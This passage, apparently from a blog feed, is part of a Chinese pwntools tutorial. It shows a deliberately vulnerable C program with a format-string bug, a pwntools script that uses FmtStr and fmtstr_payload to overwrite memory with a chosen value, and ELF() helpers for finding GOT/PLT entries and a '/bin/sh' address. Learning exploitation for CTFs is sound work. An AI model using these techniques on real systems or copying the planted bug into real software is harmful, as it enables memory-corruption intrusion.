*my_var = TARGET;</span><br><span class="line">       ptr = mmap(MEMORY_ADDRESS, MEMORY_SIZE, PROT_READ|PROT_WRITE, MAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE, 0, 0);</span><br><span class="line">       if(ptr != MEMORY_ADDRESS)</span><br><span class="line">       &#123;</span><br><span class="line">               perror(&quot;mmap&quot;);</span><br><span class="line">               return EXIT_FAILURE;</span><br><span class="line">       &#125;</span><br><span class="line">       *my_var = 0x41414141;</span><br><span class="line">       write(1, &amp;my_var, sizeof(int *));</span><br><span class="line">       scanf(&quot;%s&quot;, buff);</span><br><span class="line">       dprintf(2, buff);</span><br><span class="line">       write(1, my_var, sizeof(int));</span><br><span class="line">       return 0;</span><br><span class="line">&#125;&apos;&apos;&apos;)</span><br><span class="line">cmdline = [&quot;gcc&quot;, source, &quot;-Wno-format-security&quot;, &quot;-m32&quot;, &quot;-o&quot;, program]</span><br><span class="line">process(cmdline).wait_for_close()</span><br><span class="line">def exec_fmt(payload):</span><br><span class="line">    p = process(program)</span><br><span class="line">    p.sendline(payload)</span><br><span class="line">    return p.recvall()</span><br><span class="line"> </span><br><span class="line">autofmt = FmtStr(exec_fmt)</span><br><span class="line">offset = autofmt.offset</span><br><span class="line">p = process(program, stderr=PIPE)</span><br><span class="line">addr = u32(p.recv(4))</span><br><span class="line">payload = fmtstr_payload(offset, &#123;addr: 0x1337babe&#125;)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">print hex(unpack(p.recv(4)))</span><br></pre></td></tr></table></figure>
-
-<p>有了 <code>FmtStr</code>, 我们不用算偏移量算到疯. 我们需要先构造一个可以接收我们输入并返回格式化字符串输出的函数. 接着，我们可以得到 <code>autofmt</code>. 这个对象包含 <code>offset</code>, 即算好的偏移量. <code>fmtstr_payload(offset, {address: value})</code> 帮我们生成最后的payload. 第一个参数 <code>offset</code> 用 <code>autofmt.offset</code> 算好的即可. 然后, 我们需要声明 <code>{address: value}</code> 来覆盖address的内容成对应的value. 我们还可以同时改写多个地址:<code>{address1: value1, address2:value2,..., address: valueN}</code>.</p>
-<p>有些情况不能自动生成payload. 以下文档介绍了如何手动生成payload .<br><a href="http://docs.pwntools.com/en/stable/fmtstr.html#pwnlib.fmtstr.fmtstr_payload" target="_blank" rel="noopener">http://docs.pwntools.com/en/stable/fmtstr.html#pwnlib.fmtstr.fmtstr_payload</a></p>
-<h2 id="使用-ELF"><a href="#使用-ELF" class="headerlink" title="使用 ELF()"></a>使用 ELF()</h2><p>有些题目给了我们libc. 用 <code>gdb&gt; x function1 — function2</code> 算偏移量太麻烦了, 因此有了 <code>ELF</code>.</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"> </span><br><span class="line">e = ELF(&apos;./example_file&apos;)</span><br><span class="line">print hex(e.address)  # 0x400000</span><br><span class="line">print hex(e.symbols[&apos;write&apos;]) # 0x401680</span><br><span class="line">print hex(e.got[&apos;write&apos;]) # 0x60b070</span><br><span class="line">print hex(e.plt[&apos;write&apos;]) # 0x401680</span><br><span class="line">offset = e.symbols[&apos;system&apos;] - e.symbols[&apos;printf&apos;] # calculate offset</span><br><span class="line">binsh_address = next(e.search(&apos;/bin/sh\x00&apos;)) # find address which contains /bin/sh</span><br></pre></td></tr></table></figure>
-
-<p>和 process() 一样, 我们只用将路径给 ELF(path) 即可分析 ELF.</p>
-<p>我们有以下几种方法操纵ELF:</p>
-<ul>
-<li>symbols[‘a_function’] 找到 a_function 的地址</li>
-<li>got[‘a_function’] 找到 a_function的 got</li>
-<li>plt[‘a_function’] 找到 a_function 的 plt</li>
-<li>next(e.search(“some_characters”)) 找到包含 some_characters（字符串，汇编代码或者某个数值）的地址.</li>
-</ul>
-]]></content>
-      <tags>
-        <tag>pwn</tag>
       </tags>
   </entry>
   <entry>
